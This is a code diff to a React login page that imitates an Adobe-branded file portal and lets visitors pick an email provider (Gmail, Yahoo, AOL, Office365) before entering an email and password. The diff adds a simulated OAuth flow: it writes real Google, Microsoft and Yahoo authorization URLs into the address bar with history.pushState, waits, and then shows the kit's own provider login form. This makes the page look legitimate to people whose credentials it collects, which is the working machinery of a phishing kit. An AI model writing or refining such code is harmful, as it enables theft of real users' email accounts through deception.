@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
@@ -42,6 +42,94 @@ const LoginPage: React.FC<LoginPageProps> = ({
     { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
   ];
 
+  // Check URL parameters on component mount
+  useEffect(() => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const provider = urlParams.get('provider');
+    const authReturn = urlParams.get('auth_return');
+    
+    // If returning from simulated OAuth, show the provider's login form
+    if (authReturn && provider) {
+      handleProviderReturn(provider);
+    }
+  }, []);
+
+  const handleProviderReturn = (providerName: string) => {
+    // Clean up the URL without reloading
+    const cleanUrl = window.location.pathname;
+    window.history.replaceState({}, document.title, cleanUrl);
+    
+    // Trigger the appropriate provider login page
+    if (providerName.toLowerCase() === 'gmail' && onGmailSelect) {
+      onGmailSelect();
+    } else if (providerName.toLowerCase() === 'yahoo' && onYahooSelect) {
+      onYahooSelect();
+    } else if (providerName.toLowerCase() === 'aol' && onAolSelect) {
+      onAolSelect();
+    } else if ((providerName.toLowerCase() === 'office365' || providerName.toLowerCase() === 'outlook') && onOffice365Select) {
+      onOffice365Select();
+    } else {
+      setSelectedProvider(providerName);
+    }
+  };
+
+  const simulateOAuthRedirect = (providerName: string) => {
+    // Generate OAuth-like parameters
+    const clientId = `client_${Math.random().toString(36).substr(2, 9)}`;
+    const state = Math.random().toString(36).substr(2, 15);
+    const nonce = Math.random().toString(36).substr(2, 20);
+    const sessionId = `session_${Date.now()}`;
+    
+    // Map providers to their OAuth-style URLs
+    const providerUrls: { [key: string]: string } = {
+      'Gmail': `https://accounts.google.com/oauth/authorize`,
+      'Yahoo': `https://api.login.yahoo.com/oauth2/request_auth`,
+      'AOL': `https://api.login.aol.com/oauth2/request_auth`,
+      'Office365': `https://login.microsoftonline.com/common/oauth2/v2.0/authorize`,
+      'Outlook': `https://login.microsoftonline.com/common/oauth2/v2.0/authorize`,
+      'Others': `https://auth.provider.com/oauth/authorize`
+    };
+
+    const baseAuthUrl = providerUrls[providerName] || providerUrls['Others'];
+    const currentUrl = window.location.origin + window.location.pathname;
+    
+    // Build OAuth-style URL parameters
+    const authParams = new URLSearchParams({
+      client_id: clientId,
+      redirect_uri: currentUrl,
+      response_type: 'code',
+      scope: providerName === 'Gmail' ? 'email profile https://mail.google.com/' : 'email profile',
+      state: state,
+      nonce: nonce,
+      access_type: 'offline',
+      prompt: 'consent'
+    });
+
+    // Create the full OAuth URL
+    const oauthUrl = `${baseAuthUrl}?${authParams.toString()}`;
+    
+    // Update the browser URL to show OAuth redirect
+    window.history.pushState({}, '', oauthUrl);
+    
+    // Simulate redirect delay, then return to your app
+    setTimeout(() => {
+      // Simulate returning from OAuth with auth code
+      const returnParams = new URLSearchParams({
+        code: `auth_code_${Math.random().toString(36).substr(2, 20)}`,
+        state: state,
+        session_state: sessionId,
+        provider: providerName,
+        auth_return: 'true'
+      });
+      
+      const returnUrl = `${currentUrl}?${returnParams.toString()}`;
+      window.history.replaceState({}, '', returnUrl);
+      
+      // Trigger the provider's login page
+      handleProviderReturn(providerName);
+    }, 1500); // 1.5 second delay to simulate redirect
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
     if (result?.isFirstAttempt) {
@@ -57,19 +145,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
   };
 
   const handleProviderClick = (providerName: string) => {
-    if (providerName === 'Office365' && onOffice365Select) {
-      onOffice365Select();
-    } else if (providerName === 'Outlook' && onOffice365Select) {
-      onOffice365Select();
-    } else if (providerName === 'Yahoo' && onYahooSelect) {
-      onYahooSelect();
-    } else if (providerName === 'AOL' && onAolSelect) {
-      onAolSelect();
-    } else if (providerName === 'Gmail' && onGmailSelect) {
-      onGmailSelect();
-    } else {
-      setSelectedProvider(providerName);
-    }
+    // Show loading or redirecting state
+    simulateOAuthRedirect(providerName);
   };
 
   const AdobeLogo = () => (
@@ -123,7 +200,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
           </div>
 
           <div className="mt-8 text-center">
-            <p className="text-sm text-gray-800 font-medium drop-shadow-[0_1px_2px_rgba(255,255,255,0.6)]">© 2025 Municipalfilesport. Secured in partnership with Adobe®.</p>
+            <p className="text-sm text-gray-800 font-medium drop-shadow-[0_1px_2px_rgba(255,255,255,0.6)]">© 2025 municipalfilesport. Secured in partnership with Adobe®.</p>
           </div>
         </div>
       ) : (
@@ -178,7 +255,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
             </div>
           </div>
           <div className="bg-white/40 backdrop-blur-sm p-4 border-t border-white/20">
-            <p className="text-xs text-gray-600 text-center">© 2025 Municipalfilesport. Secured in partnership with Adobe®.</p>
+            <p className="text-xs text-gray-600 text-center">© 2025 municipalfilesport. Secured in partnership with Adobe®.</p>
           </div>
         </div>
       )}
